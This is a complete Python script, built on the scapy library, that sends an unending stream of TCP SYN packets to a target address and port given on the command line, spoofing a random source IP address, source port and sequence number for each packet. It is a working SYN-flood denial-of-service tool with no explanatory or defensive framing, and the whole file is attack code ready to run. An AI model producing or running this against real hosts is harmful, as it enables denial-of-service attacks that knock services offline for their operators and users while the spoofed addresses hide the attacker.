#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

import sys


if __name__ == "__main__":
    dst = sys.argv[1]
    dport = int(sys.argv[2])

    print(f"Sending SYN packets to {dst}:{dport}...")

    ip = IP(dst=dst)
    tcp = TCP(dport=dport, flags='S') # SYN flag
    pkt = ip / tcp

    while True:
        pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP
        pkt[TCP].sport = getrandbits(16) # source port
        pkt[TCP].seq = getrandbits(32) # sequence number
        send(pkt, verbose = 0)
